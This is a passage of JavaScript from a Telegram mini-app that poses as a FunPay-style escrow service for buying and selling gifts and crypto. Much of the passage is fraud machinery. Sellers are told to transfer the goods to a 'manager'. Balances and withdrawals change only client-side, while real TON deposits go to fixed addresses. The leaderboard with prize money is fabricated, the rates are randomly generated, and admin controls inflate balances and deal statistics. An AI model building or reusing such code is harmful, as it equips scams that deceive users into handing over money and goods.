    + '<div class="dd-info-row dd-last-row"><span class="dd-label">Создана</span><span>' + created + '</span></div>'
    + '</div>'

    + '<div class="' + secClass + '"><div class="dd-now-label">' + secLabel + '</div>'
    + '<div class="dd-now-text">' + nowText + '</div></div>'
    + '<div class="dd-actions">' + actHtml + '</div>'
    + payCardHtml + successHtml;

  document.getElementById('dealCreatedToast').style.display = 'none';
  openModal('modalDealDetail');
}


// ─── DEAL ACTIONS ─────────────────────────────────────────────────────────────








function shareDeal(id) {
  const d = state.deals.find(x=>x.id===id); if (!d) return
  const typeLabel = d.dealType==='buy'?'покупка':'продажа'
  const _creator = tg?.initDataUnsafe?.user?.username || 'user'
  const sp = `DEAL-${d.id}-${parseFloat(d.amount)}-${d.currency}-${d.dealType}-${_creator}`
  const dealUrl = `https://t.me/FunpaySaf_Robot?start=${sp}` // замените username вашего бота
  const msgText = `💼 Сделка #${d.id}\n${typeLabel}: ${d.amount} ${d.currency}\n${d.description||''}\n\nПрисоединяйтесь:`
  try {
    if (tg) {
      tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(dealUrl)}&text=${encodeURIComponent(msgText)}`)
    } else {
      window.open(`https://t.me/share/url?url=${encodeURIComponent(dealUrl)}&text=${encodeURIComponent(msgText)}`)
    }
  } catch(e) {
    try { navigator.clipboard.writeText(dealUrl + '\n' + msgText) } catch {}
    showToast('Ссылка скопирована!')
  }
}

// ── Buyer pays ────────────────────────────────────────────────────────────────
async function buyerPayDeal(id) {
  var d = state.deals.find(function(x) { return x.id === id; });
  if (!d) return;
  var total = parseFloat(d.amount) * 1.01;
  var curBal = (state.balances && state.balances[d.currency]) || 0;
  if (curBal < total) { showToast('Недостаточно средств на балансе'); return; }
  if (!state.balances) state.balances = {};
  state.balances[d.currency] = curBal - total;
  d.status = 'funded'; d.step = 2;
  if (!state.stats) state.stats = {};
  state.stats.active = (state.stats.active || 0) + 1;
  saveState(); renderStats(); renderBalances(); renderAdminPanel();
  var uid = tg && tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id;
  apiCall('/api/deals/' + id, 'PUT', { action: 'buyer_paid', actorId: uid });
  closeModal('modalDealDetail');
  setTimeout(function() { openDealDetail(id); }, 200);
  showToast('✅ Оплачено! Ожидайте передачи товара.');
}

// ── Seller: show transfer confirmation ────────────────────────────────────────
function showTransferConfirm(id) {
  document.getElementById('transferConfirmId').value = id;
  document.getElementById('modalTransferConfirm').style.display = 'flex';
}
function closeTransferConfirm() {
  document.getElementById('modalTransferConfirm').style.display = 'none';
}
async function doTransferConfirm() {
  var id = document.getElementById('transferConfirmId').value;
  closeTransferConfirm();
  var d = state.deals.find(function(x) { return x.id === id; });
  if (!d) return;
  d.step = 3; d.status = 'escrow';
  saveState();
  var uid = tg && tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id;
  apiCall('/api/deals/' + id, 'PUT', { action: 'seller_transferred', actorId: uid });
  setTimeout(function() { openDealDetail(id); }, 200);
  showToast('✅ Подарок у менеджера — ожидаем покупателя');
}

// ── Buyer: show receipt confirmation ──────────────────────────────────────────
function showReceiptConfirm(id) {
  document.getElementById('receiptConfirmId').value = id;
  document.getElementById('modalReceiptConfirm').style.display = 'flex';
}
function closeReceiptConfirm() {
  document.getElementById('modalReceiptConfirm').style.display = 'none';
}
async function doReceiptConfirm() {
  var id = document.getElementById('receiptConfirmId').value;
  closeReceiptConfirm();
  var d = state.deals.find(function(x) { return x.id === id; });
  if (!d) return;
  d.step = 4; d.status = 'completed';
  if (!state.stats) state.stats = {};
  state.stats.active    = Math.max(0, (state.stats.active || 1) - 1);
  state.stats.completed = (state.stats.completed || 0) + 1;
  saveState(); renderDeals(); renderStats(); renderAdminPanel();
  var uid = tg && tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id;
  apiCall('/api/deals/' + id, 'PUT', { action: 'buyer_confirmed', actorId: uid });
  stopDealPolling(); closeModal('modalDealDetail');
  setTimeout(function() { openDealDetail(id); }, 200);
  showToast('🎉 Сделка завершена!');
}

// ── Cancel deal ───────────────────────────────────────────────────────────────


async function cancelDeal(id) {
  var d = state.deals.find(function(x) { return x.id === id; });
  if (!d) return;
  if (d.status === 'funded' || d.status === 'escrow') {
    d.status = 'disputed'; saveState();
    var uid2 = tg && tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id;
    apiCall('/api/deals/' + id, 'PUT', { action: 'dispute', actorId: uid2 });
    stopDealPolling(); closeModal('modalDealDetail'); renderDeals();
    showToast('⚠️ Спор открыт — обратитесь к @Funpay_Maneger');
    return;
  }
  if (!state.stats) state.stats = {};
  if (d.status === 'active' || d.status === 'pending') {
    state.stats.active = Math.max(0, (state.stats.active || 0) - 1);
  }
  d.status = 'cancelled';
  state.stats.cancelled = (state.stats.cancelled || 0) + 1;
  saveState(); renderStats(); renderAdminPanel();
  var uid3 = tg && tg.initDataUnsafe && tg.initDataUnsafe.user && tg.initDataUnsafe.user.id;
  apiCall('/api/deals/' + id, 'PUT', { action: 'cancel', actorId: uid3 });
  stopDealPolling(); closeModal('modalDealDetail'); renderDeals();
  showToast('Сделка отменена');
}




// ─── CREATE DEAL ───────────────────────────────────────────────────────────────
function resetDealForm() {
  newDeal = {}
  showDealStep('dealStep1')
  document.getElementById('dealAmountInput').value = ''
  document.getElementById('dealDescInput').value = ''
}
function showDealStep(id) {
  ['dealStep1','dealStep2','dealStep3','dealStepSecurity','dealStep4','dealStep5'].forEach(s => {
    document.getElementById(s).style.display = s===id?'':'none'
  })
}
function selectDealType(type) { newDeal.dealType=type; showDealStep('dealStep2') }
function dealBack(to) {
  if (to===1) showDealStep('dealStep1')
  else if (to===2) showDealStep('dealStep2')
  else if (to===3) showDealStep('dealStep3')
  else if (to===4) showDealStep('dealStep4')
}

function renderCurrencyGrid() {
  document.getElementById('currencyGrid').innerHTML = CURRENCIES.map(c=>`
    <button class="cur-select-btn" onclick="selectCurrency('${c.id}')">
      ${svgIcon(c.id,36)}<span>${c.label}</span>
    </button>`).join('')
}

function selectCurrency(id) {
  newDeal.currency = id
  document.getElementById('dealAmountCurrency').textContent = id
  showDealStep('dealStep3')
}

function dealStep3Next() {
  const amt = document.getElementById('dealAmountInput').value
  if (!amt||parseFloat(amt)<=0) { showToast('Введите корректную сумму'); return }
  newDeal.amount = amt; startSecurityTimer(); showDealStep('dealStepSecurity')
}

let secInt = null
function startSecurityTimer() {
  let s=8; const btn=document.getElementById('btnReadSecurity'); const el=document.getElementById('secTimer')
  btn.disabled=true; btn.textContent=`Прочитайте — ${s}с`
  clearInterval(secInt)
  secInt = setInterval(()=>{ s--; if(s<=0){ clearInterval(secInt); btn.disabled=false; btn.textContent='Продолжить →'; btn.onclick=()=>showDealStep('dealStep4') } else { btn.textContent=`Прочитайте — ${s}с` } },1000)
  btn.onclick = null
}

function dealStep4Next() {
  const desc = document.getElementById('dealDescInput').value.trim()
  if (!desc) { showToast('Заполните описание товара'); return }
  newDeal.description = desc
  document.getElementById('confirmType').textContent = newDeal.dealType==='buy'?'Покупка':'Продажа'
  document.getElementById('confirmAmount').textContent = newDeal.amount+' '+newDeal.currency
  document.getElementById('confirmDesc').textContent = desc
  showDealStep('dealStep5')
}

async function createDeal() {
  var id    = Math.random().toString(36).substr(2,6).toUpperCase();
  var user  = tg && tg.initDataUnsafe && tg.initDataUnsafe.user;
  var uname = (user && user.username) || 'user';
  var uid   = (user && user.id) || 0;
  var deal = {
    id: id,
    dealType: newDeal.dealType,
    myRole: newDeal.dealType,
    currency: newDeal.currency,
    amount: newDeal.amount,
    description: newDeal.description,
    status: 'pending',
    step: 0,
    createdAt: Date.now(),
    creatorId: uid,
    creatorUsername: uname,
    buyerId:       newDeal.dealType === 'buy'  ? uid   : null,
    buyerUsername: newDeal.dealType === 'buy'  ? uname : null,
    sellerId:      newDeal.dealType === 'sell' ? uid   : null,
    sellerUsername:newDeal.dealType === 'sell' ? uname : null,
    hasPartner: false
  };
  state.deals.push(deal);
  saveState(); renderStats(); renderAdminPanel(); renderDeals();
  apiCall('/api/deals', 'POST', deal);
  closeModal('modalCreateDeal');
  setTimeout(function() {
    openDealDetail(id);
    document.getElementById('dealCreatedToast').style.display = 'block';
  }, 200);
}


// ─── WALLETS ──────────────────────────────────────────────────────────────────
const WALLET_SPECIAL = {
  STARS: 'stars'
}

// ─── LEADERBOARD DATA ─────────────────────────────────────────────────────────
const LEADERBOARD_USERS = [
  { rank:1,  name:'Максим К.',   username:'maxim_crypto',  volume:284500, deals:847,  color:'#f59e0b' },
  { rank:2,  name:'Анна С.',     username:'anna_otc',      volume:231200, deals:673,  color:'#9ca3af' },
  { rank:3,  name:'Дмитрий В.',  username:'dima_trade',    volume:198700, deals:541,  color:'#b45309' },
  { rank:4,  name:'Ольга М.',    username:'olga_market',   volume:167300, deals:489,  color:'#1a7cf8' },
  { rank:5,  name:'Артём П.',    username:'artem_p',       volume:143800, deals:412,  color:'#22c55e' },
  { rank:6,  name:'Светлана Н.', username:'sveta_n',       volume:128400, deals:387,  color:'#6366f1' },
  { rank:7,  name:'Игорь К.',    username:'igor_k_ton',    volume:112600, deals:341,  color:'#8b5cf6' },
  { rank:8,  name:'Кирилл Д.',   username:'kirill_d',      volume:98700,  deals:298,  color:'#ec4899' },
  { rank:9,  name:'Мария Л.',    username:'maria_ltc',     volume:87300,  deals:261,  color:'#14b8a6' },
  { rank:10, name:'Алексей Р.',  username:'alex_r',        volume:76500,  deals:234,  color:'#f97316' },
  { rank:11, name:'Виктор Т.',   username:'viktor_t',      volume:68200,  deals:198,  color:'#1a7cf8' },
  { rank:12, name:'Наталья Б.',  username:'natasha_b',     volume:59800,  deals:182,  color:'#6366f1' },
  { rank:13, name:'Сергей Ж.',   username:'sergey_zh',     volume:51400,  deals:156,  color:'#22c55e' },
  { rank:14, name:'Татьяна Ф.',  username:'tanya_f',       volume:44700,  deals:134,  color:'#1a7cf8' },
  { rank:15, name:'Николай В.',  username:'nikolai_v',     volume:38900,  deals:117,  color:'#8b5cf6' },
  { rank:16, name:'Елена С.',    username:'elena_s',       volume:33200,  deals:98,   color:'#f59e0b' },
  { rank:17, name:'Павел М.',    username:'pavel_m',       volume:28400,  deals:84,   color:'#ec4899' },
  { rank:18, name:'Юрий К.',     username:'yuri_k',        volume:23700,  deals:71,   color:'#14b8a6' },
  { rank:19, name:'Оксана Д.',   username:'oksana_d',      volume:18900,  deals:57,   color:'#f97316' },
  { rank:20, name:'Роман Е.',    username:'roman_e',       volume:14300,  deals:43,   color:'#6366f1' },
]

function renderLeaderboard() {
  const myUsername = tg?.initDataUnsafe?.user?.username || null
  const html = LEADERBOARD_USERS.map(u => {
    const isMe = myUsername && u.username === myUsername
    const isTop = u.rank <= 3
    const medal = u.rank === 1 ? '🥇' : u.rank === 2 ? '🥈' : u.rank === 3 ? '🥉' : u.rank
    const prize = u.rank === 1 ? '$10K' : u.rank === 2 ? '$5K' : u.rank === 3 ? '$3K' : u.rank <= 10 ? '$1.7K' : u.rank <= 50 ? '$200' : ''
    const vol = u.volume >= 1000 ? '$' + (u.volume/1000).toFixed(0) + 'K' : '$' + u.volume
    return `<div class="lb-row ${isMe ? 'lb-row-me' : ''} ${isTop ? 'lb-rank-top' : ''}">
      <div class="lb-rank-num">${medal}</div>
      <div class="lb-avatar" style="background:${u.color}">${u.name[0]}</div>
      <div class="lb-info">
        <div class="lb-name">${isMe ? '⭐ ' + u.name : u.name}</div>
        <div class="lb-username">@${u.username} &middot; ${u.deals} сделок</div>
      </div>
      <div class="lb-right">
        <div class="lb-volume">${vol}</div>
        ${prize ? `<div class="lb-prize">${prize}</div>` : ''}
      </div>
    </div>`
  }).join('')
  document.getElementById('leaderboardList').innerHTML = html
}

function renderWalletCurrencyTabs() {
  document.getElementById('walletCurrencyTabs').innerHTML = CURRENCIES.map(c=>`
    <button class="cur-tab ${c.id===walletCurrency?'active':''}" onclick="selectWalletCurrency('${c.id}')">
      ${svgIcon(c.id,22)}&nbsp;${c.label}
    </button>`).join('')
  document.getElementById('walletBoxLabel').textContent = walletCurrency + ' Кошелек'

  const walletCard = document.querySelector('.wallet-box')
  const depBtn  = document.getElementById('btnDeposit')
  const witBtn  = document.getElementById('btnWithdraw')
  const connBtn = document.getElementById('btnConnectWallet')
  const connStatus = document.getElementById('walletConnectStatus')

  // reset defaults
  depBtn.style.display  = ''
  witBtn.style.display  = ''
  connBtn.style.display = walletCurrency === 'TON' ? '' : 'none'
  connStatus.innerHTML  = ''

  const special = WALLET_SPECIAL[walletCurrency]

  if (special === 'stars') {
    walletCard.innerHTML = `
      <div class="wallet-box-label">⭐ Telegram Stars</div>
      <div class="wallet-special-info">
        <div class="wallet-special-icon">⭐</div>
        <div class="wallet-special-text">
          <strong>Баланс: ${(state.balances.STARS||0).toFixed(0)} Stars</strong><br>
          <span>Пополнение через встроенную оплату Telegram Stars</span>
        </div>
      </div>
      <button class="btn-primary btn-block mt-12" onclick="openStarsPayment()">
        ⭐ Купить Stars через бота
      </button>`
    depBtn.style.display = 'none'
    witBtn.style.display = 'none'
  } else if (special === 'unavailable') {
    // RUB — недоступно
    walletCard.innerHTML = `
      <div class="wallet-box-label">₽ Рублёвый счёт</div>
      <div class="wallet-unavailable">
        <div class="unavail-icon">🚫</div>
        <div>
          <strong>Временно недоступно</strong><br>
          <span>Пополнение в рублях будет доступно в следующем обновлении</span>
        </div>
      </div>`
    depBtn.style.display = 'none'
    witBtn.style.display = 'none'
  } else {
    // Обычная валюта
    walletCard.innerHTML = `
      <div class="wallet-box-label" id="walletBoxLabel">${walletCurrency} Кошелек</div>
      <div id="walletConnectStatus" class="wallet-status"></div>
      ${walletCurrency === 'TON' ? `<button class="btn-primary btn-block" id="btnConnectWallet">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><rect x="2" y="6" width="20" height="14" rx="2" stroke="currentColor" stroke-width="2"/><path d="M16 13a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" fill="currentColor"/><path d="M2 10h20" stroke="currentColor" stroke-width="2"/></svg>
        Подключить TON кошелёк
      </button>` : `<div class="wallet-balance-display">
        <span class="wallet-bal-num">${(state.balances[walletCurrency]||0).toFixed(2)}</span>
        <span class="wallet-bal-cur">${walletCurrency}</span>
      </div>`}`
    // Re-bind TON connect button if just re-rendered
    if (walletCurrency === 'TON') {
      setTimeout(() => {
        const btn = document.getElementById('btnConnectWallet')
        if (btn) btn.onclick = handleWalletConnect
        const st = document.getElementById('walletConnectStatus')
        if (st && tonConnectUI?.wallet) updateWalletUI(tonConnectUI.wallet)
      }, 0)
    }
    depBtn.style.display  = ''
    witBtn.style.display  = ''
  }
}

function selectWalletCurrency(id) { walletCurrency=id; renderWalletCurrencyTabs() }

function openStarsPayment() {
  // Telegram Stars invoice via bot
  try {
    if (tg) {
      tg.openTelegramLink(`https://t.me/FunpaySaf_Robot?start=buy_stars`) // замените username бота
    }
  } catch(e) {}
  showToast('Переход к боту для покупки Stars…')
}

function openDepositModal() {
  if (WALLET_SPECIAL[walletCurrency] === 'stars') { openStarsPayment(); return }
  if (WALLET_SPECIAL[walletCurrency] === 'unavailable') { showToast('Пополнение в ' + walletCurrency + ' временно недоступно'); return }
  if (walletCurrency === 'RUB') { openRubDeposit(); return }
  if (walletCurrency === 'USDT') { showDepositAddress('USDT', DEPOSIT_USDT_ADDRESS); return }
  if (walletCurrency === 'TON' && !tonConnectUI?.wallet) { showDepositAddress('TON', DEPOSIT_TON_ADDRESS); return }
  document.getElementById('depositAmount').value=''
  document.getElementById('depositTitle').textContent=`Пополнить ${walletCurrency}`
  openModal('modalDeposit')
}

// ─── RUB DEPOSIT ──────────────────────────────────────────────────────────────
function openRubDeposit() {
  document.getElementById('rubDepositAmount').value = ''
  openModal('modalDepositRUB')
}

function copyRubCard() {
  const num = DEPOSIT_CARD_RUB
  try {
    navigator.clipboard.writeText(num)
      .then(() => showToast('✅ Номер карты скопирован!'))
      .catch(() => showToast('Карта: ' + num))
  } catch { showToast('Карта: ' + num) }
}

function createRubPayment() {
  const amt = parseFloat(document.getElementById('rubDepositAmount').value)
  if (!amt || amt < 1) { showToast('Введите сумму'); return }
  const code = String(Math.floor(100 + Math.random() * 900))
  document.getElementById('rubInstrAmount').textContent = amt.toLocaleString('ru-RU')
  document.getElementById('rubPayCode').textContent = code
  closeModal('modalDepositRUB')
  openModal('modalRUBInstructions')
}

function copyRubCode() {
  const code = document.getElementById('rubPayCode').textContent
  try {
    navigator.clipboard.writeText(code)
      .then(() => showToast('✅ Код скопирован: ' + code))
      .catch(() => showToast('Ваш код: ' + code))
  } catch { showToast('Ваш код: ' + code) }
}

function confirmRubSent() {
  closeModal('modalRUBInstructions')
  showToast('✅ Ожидаем поступления. Баланс пополнится после проверки перевода')
}

async function doDeposit() {
  const amt = parseFloat(document.getElementById('depositAmount').value)
  if (!amt || amt <= 0) { showToast('Введите корректную сумму'); return }

  if (walletCurrency === 'TON' && tonConnectUI?.wallet) {
    try {
      const nanoTon = (BigInt(Math.round(amt * 1e9))).toString()
      await tonConnectUI.sendTransaction({
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [{ address: DEPOSIT_TON_ADDRESS, amount: nanoTon }]
      })
      state.balances.TON = (state.balances.TON || 0) + amt
      saveState(); renderBalances(); closeModal('modalDeposit')
      showToast('✅ TON отправлены! Зачисление после подтверждения сети')
    } catch(e) {
      const msg = String(e?.message || '').toLowerCase()
      showToast(msg.includes('cancel') || msg.includes('reject') || msg.includes('дени') ? 'Транзакция отменена' : 'Ошибка при отправке')
    }
    return
  }

  if (amt < 1) { showToast('Минимум 1 ' + walletCurrency); return }
  state.balances[walletCurrency] = (state.balances[walletCurrency] || 0) + amt
  saveState(); renderBalances(); closeModal('modalDeposit')
  showToast('✅ Баланс пополнен на ' + amt + ' ' + walletCurrency)
}

function showDepositAddress(currency, address) {
  const userId = tg?.initDataUnsafe?.user?.id
  document.getElementById('depAddrTitle').textContent = 'Пополнить ' + currency
  document.getElementById('depAddrCurrency').textContent = currency
  document.getElementById('depAddrAddress').textContent = address
  document.getElementById('depAddrWarnCur').textContent = currency
  const memoSection = document.getElementById('depAddrMemoSection')
  if (memoSection) {
    if (userId) {
      document.getElementById('depAddrMemo').textContent = 'tg:' + userId
      memoSection.style.display = ''
    } else {
      memoSection.style.display = 'none'
    }
  }
  openModal('modalDepositAddress')
}

function copyDepositAddress() {
  const addr = document.getElementById('depAddrAddress').textContent
  try {
    navigator.clipboard.writeText(addr)
      .then(() => showToast('✅ Адрес скопирован!'))
      .catch(() => showToast('Скопируйте адрес вручную'))
  } catch { showToast('Скопируйте адрес вручную') }
}

function copyDepositMemo() {
  const memo = document.getElementById('depAddrMemo')?.textContent || ''
  try {
    navigator.clipboard.writeText(memo)
      .then(() => showToast('✅ Комментарий скопирован!'))
      .catch(() => showToast('Комментарий: ' + memo))
  } catch { showToast('Комментарий: ' + memo) }
}

// ─── JOIN DEAL ────────────────────────────────────────────────────────────────
let _joinDealInfo = null

function showJoinDealModal(info) {
  _joinDealInfo = info
  // Показываем СВОЮ роль (противоположная роли создателя)
  const myRole  = info.dealType === 'sell' ? 'buy' : 'sell'
  const typeLabel = myRole === 'buy' ? '🟢 Вы — Покупатель' : '🔴 Вы — Продавец'
  document.getElementById('joinDealType').textContent   = typeLabel
  document.getElementById('joinDealAmount').textContent = info.amount + ' ' + info.currency
  document.getElementById('joinDealId').textContent     = '#' + info.id
  openModal('modalJoinDeal')
}

async function acceptJoinDeal() {
  if (!_joinDealInfo) return;
  var info   = _joinDealInfo;
  var user   = tg && tg.initDataUnsafe && tg.initDataUnsafe.user;
  var joiner = (user && user.username) || 'user';
  var uid    = (user && user.id) || 0;
  var myRole = info.dealType === 'sell' ? 'buy' : 'sell';

  // If already have this deal locally, just open it
  var existing = state.deals.find(function(x) { return x.id === info.id; });
  if (existing) {
    closeModal('modalJoinDeal'); switchTab('deals');
    setTimeout(function() { openDealDetail(info.id); }, 200);
    showToast('Открываем сделку...');
    _joinDealInfo = null; return;
  }

  // Try to fetch from server
  var sv = await apiCall('/api/deals/' + info.id);
  var creator   = (sv && sv.creatorUsername) || info.creatorUsername || null;
  var creatorId = (sv && sv.creatorId) || null;

  var deal = {
    id: info.id,
    dealType: myRole,
    myRole: myRole,
    amount:      (sv && sv.amount)      || info.amount      || '?',
    currency:    (sv && sv.currency)    || info.currency    || 'TON',
    description: (sv && sv.description) || 'Присоединился через ссылку',
    status: 'active',
    step: Math.max((sv && sv.step) || 0, 1),
    createdAt: (sv && sv.createdAt) || Date.now(),
    creatorId: creatorId,
    creatorUsername: creator,
    buyerId:       myRole === 'buy'  ? uid    : ((sv && sv.buyerId)  || creatorId),
    buyerUsername: myRole === 'buy'  ? joiner : ((sv && sv.buyerUsername) || creator),
    sellerId:      myRole === 'sell' ? uid    : ((sv && sv.sellerId) || creatorId),
    sellerUsername:myRole === 'sell' ? joiner : ((sv && sv.sellerUsername) || creator),
    hasPartner: true
  };
  state.deals.push(deal);
  saveState(); renderDeals(); renderStats();

  apiCall('/api/deals/' + info.id + '/join', 'PUT', {
    joinerId: uid, joinerUsername: joiner, myRole: myRole
  });

  closeModal('modalJoinDeal'); switchTab('deals');
  setTimeout(function() { openDealDetail(info.id); }, 300);
  showToast('✅ Вы присоединились к сделке!');
  _joinDealInfo = null;
}


function openWithdrawModal() {
  if (WALLET_SPECIAL[walletCurrency] === 'unavailable') { showToast('Вывод в ' + walletCurrency + ' временно недоступен'); return }
  document.getElementById('withdrawAvailable').textContent = (state.balances[walletCurrency]||0).toFixed(2)
  document.getElementById('withdrawAmount').value=''
  openModal('modalWithdraw')
}
function setWithdrawMethod(m) {
  withdrawMethod=m
  document.getElementById('wMethodTg').classList.toggle('active',m==='tg')
  document.getElementById('wMethodWallet').classList.toggle('active',m==='wallet')
  document.getElementById('withdrawMethodDesc').textContent = m==='tg'?'TON зачислится на TON-баланс получателя в Telegram.':'Вывод на внешний TON кошелёк.'
}
function setRecipient(mode) {
  document.getElementById('recSelf').classList.toggle('active',mode==='self')
  document.getElementById('recOther').classList.toggle('active',mode==='other')
  const rc=document.getElementById('recipientConfirmed')
  rc.style.display=mode==='self'?'block':'none'
  if(mode==='self') rc.classList.add('show')
}
function doWithdraw() {
  const amt=parseFloat(document.getElementById('withdrawAmount').value)
  if (!amt||amt<1) { showToast('Минимум 1 '+walletCurrency); return }
  if ((state.balances[walletCurrency]||0)<amt) { showToast('Недостаточно средств'); return }
  state.balances[walletCurrency]-=amt; saveState(); renderBalances(); closeModal('modalWithdraw')
  showToast('✅ Заявка на вывод создана!')
}

// ─── ADMIN ────────────────────────────────────────────────────────────────────
function adminAddBalance() { openModal('modalAdminBalance') }
function adminChangeTurnover() { document.getElementById('adminTurnoverInput').value=state.turnover; openModal('modalAdminTurnover') }
function adminChangeCounters() {
  document.getElementById('acSuccess').value=state.stats.success
  document.getElementById('acCompleted').value=state.stats.completed
  document.getElementById('acCancelled').value=state.stats.cancelled
  openModal('modalAdminCounters')
}
function applyAdminBalance() {
  const cur=document.getElementById('adminBalanceCurrency').value
  const amt=parseFloat(document.getElementById('adminBalanceAmount').value)||0
  state.balances[cur]=(state.balances[cur]||0)+amt; saveState(); renderBalances(); renderAdminPanel()
  closeModal('modalAdminBalance'); showToast('Баланс обновлён')
}
function applyAdminTurnover() {
  state.turnover=parseFloat(document.getElementById('adminTurnoverInput').value)||0
  saveState(); renderStats(); renderAdminPanel(); closeModal('modalAdminTurnover'); showToast('Оборот обновлён')
}
function applyAdminCounters() {
  state.stats.success=parseInt(document.getElementById('acSuccess').value)||0
  state.stats.completed=parseInt(document.getElementById('acCompleted').value)||0
  state.stats.cancelled=parseInt(document.getElementById('acCancelled').value)||0
  saveState(); renderStats(); renderAdminPanel(); closeModal('modalAdminCounters'); showToast('Счётчики обновлены')
}

// ─── COUNTDOWN ────────────────────────────────────────────────────────────────
function startCountdown() {
  let end = parseInt(localStorage.getItem('fpotc_cd')||'0')
  if (!end||end<=Date.now()) { end=Date.now()+(12*86400+15*3600+48*60+2)*1000; localStorage.setItem('fpotc_cd',end) }
  function tick() {
    const diff=Math.max(0,end-Date.now())
    const pad=n=>String(n).padStart(2,'0')
    document.getElementById('cdDays').textContent=pad(Math.floor(diff/86400000))
    document.getElementById('cdHours').textContent=pad(Math.floor((diff%86400000)/3600000))
    document.getElementById('cdMinutes').textContent=pad(Math.floor((diff%3600000)/60000))
    document.getElementById('cdSeconds').textContent=pad(Math.floor((diff%60000)/1000))
  }
  tick(); setInterval(tick,1000)
}

// ─── RATES ────────────────────────────────────────────────────────────────────
function startRateUpdater() {
  const base={TON:1.67,BTC:65345,USDT_RUB:72.67,ETH:1780}
  const jit=(v,p)=>v*(1+(Math.random()-.5)*p)
  function update() {
    const setRate=(id,v)=>{const el=document.getElementById(id);if(el){el.textContent=v;el.classList.remove('updated');void el.offsetWidth;el.classList.add('updated')}}
    setRate('rateTON','$'+jit(base.TON,0.02).toFixed(2))
    setRate('rateBTC','$'+Math.round(jit(base.BTC,0.01)).toLocaleString())
    setRate('rateUSDT','₽'+jit(base.USDT_RUB,0.01).toFixed(2))
    setRate('rateETH','$'+Math.round(jit(base.ETH,0.01)))
  }
  setInterval(update,8000)
}

// ─── MODALS ───────────────────────────────────────────────────────────────────
function openModal(id) { document.getElementById(id).style.display='flex' }
function closeModal(id) { document.getElementById(id).style.display='none' }

// ─── TOAST ────────────────────────────────────────────────────────────────────
let toastT=null
function showToast(msg) {
  const t=document.getElementById('toast')
  t.textContent=msg; t.style.display='block'
  clearTimeout(toastT); toastT=setTimeout(()=>t.style.display='none',2500)
}
